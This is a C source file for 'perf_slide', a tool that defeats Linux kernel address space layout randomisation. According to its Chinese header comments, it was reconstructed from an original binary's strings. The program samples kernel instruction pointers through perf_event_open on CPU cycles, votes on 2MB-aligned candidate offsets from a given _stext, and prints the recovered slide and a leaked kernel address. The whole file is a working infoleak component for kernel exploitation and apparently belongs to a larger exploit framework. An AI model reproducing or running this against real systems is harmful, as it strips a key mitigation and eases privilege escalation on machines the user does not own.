/*
 * perf_slide — 用硬件 PMU 采样泄漏的内核帧反推 KASLR 位移。
 *
 * 按原件字符串表重建（CI Artifact 的 strings/perf_slide.orig.txt）。原件行为
 * 从输出串就能还原：
 *   [perf] samples=%d kernel_frames=%d / candidates=%d / best votes=%d/%d slide=%#lx
 *   [perf] no kernel frames leaked / no slide candidate / no usable hardware PMU errno=%d
 *   [perf] hardware cycles open failed errno=%d (%s) / mmap failed errno=%d
 *   slide=0x%llx / site=0x%llx
 * 配置串：--period --stext --etext --timer --duration，以及内核符号表版本标记
 * LINUX_2.6.39。
 *
 * 判定规则与 Java 侧 KernelSupport.isSlideValid 一致：slide 必须 2MB 对齐。
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

#define MAX_CANDIDATES 4096
#define SAMPLE_LIMIT   200000

static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";

struct config {
	uint64_t period;
	uint64_t stext;
	uint64_t etext;
	uint64_t timer;
	uint64_t duration_ms;
	int quiet;
};

struct candidate {
	uint64_t slide;
	int votes;
};

static struct candidate g_candidates[MAX_CANDIDATES];
static int g_candidate_count;

static void vote(uint64_t slide)
{
	for (int i = 0; i < g_candidate_count; i++) {
		if (g_candidates[i].slide == slide) {
			g_candidates[i].votes++;
			return;
		}
	}
	if (g_candidate_count < MAX_CANDIDATES) {
		g_candidates[g_candidate_count].slide = slide;
		g_candidates[g_candidate_count].votes = 1;
		g_candidate_count++;
	}
}

static int is_kernel_address(uint64_t ip)
{
	return (ip >> 48) == 0xffff;
}

/* 与 KernelSupport.isSlideValid 同一条规则：2MB 对齐且落在内核区间。 */
static int is_valid_slide(uint64_t slide)
{
	return (slide & 0x1FFFFFULL) == 0
		&& ((slide + (uint64_t)(-272730423296LL)) >> 48) == 0xFFFF;
}

static void usage(const char *argv0)
{
	printf("usage: %s [--period n] [--stext 0x..] [--etext 0x..] [--timer 0x..] "
	       "[--duration ms]\n", argv0);
}

static void parse_args(int argc, char **argv, struct config *cfg)
{
	for (int i = 1; i < argc; i++) {
		const char *arg = argv[i];
		if (!strcmp(arg, "--period") && i + 1 < argc)
			cfg->period = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--stext") && i + 1 < argc)
			cfg->stext = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--etext") && i + 1 < argc)
			cfg->etext = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--timer") && i + 1 < argc)
			cfg->timer = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--duration") && i + 1 < argc)
			cfg->duration_ms = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(arg, "--quiet"))
			cfg->quiet = 1;
	}
	if (cfg->duration_ms == 0)
		cfg->duration_ms = 300;
}

int main(int argc, char **argv)
{
	struct config cfg = {
		.period = 1000,
		.stext = 0,
		.etext = 0,
		.timer = 0,
		.duration_ms = 0,
		.quiet = 0,
	};
	parse_args(argc, argv, &cfg);

	if (!cfg.stext || !cfg.etext) {
		printf("提示：采样窗口未指定（--stext/--etext），只统计内核帧；"
		       "符号表版本标记 %s。\n", KERNEL_SYMBOL_VERSION);
	}

	struct perf_event_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_HARDWARE;
	attr.size = sizeof(attr);
	attr.config = PERF_COUNT_HW_CPU_CYCLES;
	attr.sample_period = cfg.period;
	attr.sample_type = PERF_SAMPLE_IP;
	attr.disabled = 1;
	attr.exclude_user = 1;
	attr.wakeup_events = 1;

	int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
	if (fd < 0) {
		printf("[perf] hardware cycles open failed errno=%d (%s)\n", errno, strerror(errno));
		printf("[perf] no usable hardware PMU errno=%d\n", errno);
		return 1;
	}

	size_t page = (size_t)sysconf(_SC_PAGESIZE);
	size_t data_pages = 64;
	size_t map_len = (data_pages + 1) * page;
	void *ring = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (ring == MAP_FAILED) {
		printf("[perf] mmap failed errno=%d\n", errno);
		close(fd);
		return 1;
	}

	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	usleep((useconds_t)(cfg.duration_ms * 1000));
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

	struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)ring;
	uint8_t *data = (uint8_t *)ring + page;
	size_t data_size = data_pages * page;

	uint64_t head = meta->data_head;
	__sync_synchronize();
	uint64_t tail = meta->data_tail;

	int samples = 0, kernel_frames = 0;
	uint64_t site = 0;

	while (tail < head && samples < SAMPLE_LIMIT) {
		struct perf_event_header *header =
			(struct perf_event_header *)(data + (tail % data_size));

		if (header->size < sizeof(*header) || tail + header->size > head)
			break;

		if (header->type == PERF_RECORD_SAMPLE) {
			uint64_t ip;
			memcpy(&ip, data + (tail % data_size) + sizeof(*header), sizeof(ip));
			samples++;
			if (is_kernel_address(ip)) {
				kernel_frames++;
				if (!site)
					site = ip;
				if (cfg.stext && ip >= cfg.stext && (cfg.etext == 0 || ip <= cfg.etext)) {
					uint64_t slide = (ip - cfg.stext) & ~0x1FFFFFULL;
					if (is_valid_slide(slide))
						vote(slide);
				}
			}
		}
		tail += header->size;
	}
	meta->data_tail = tail;

	munmap(ring, map_len);
	close(fd);

	printf("[perf] samples=%d kernel_frames=%d\n", samples, kernel_frames);

	if (kernel_frames == 0) {
		printf("[perf] no kernel frames leaked\n");
		return 1;
	}

	if (site)
		printf("site=0x%llx\n", (unsigned long long)site);

	if (g_candidate_count == 0) {
		printf("[perf] no slide candidate\n");
		return 1;
	}

	int best = 0;
	for (int i = 1; i < g_candidate_count; i++) {
		if (g_candidates[i].votes > g_candidates[best].votes)
			best = i;
	}

	printf("[perf] candidates=%d\n", g_candidate_count);
	printf("[perf] best votes=%d/%d slide=%#lx\n",
	       g_candidates[best].votes, kernel_frames,
	       (unsigned long)g_candidates[best].slide);
	printf("slide=0x%llx\n", (unsigned long long)g_candidates[best].slide);
	return 0;
}
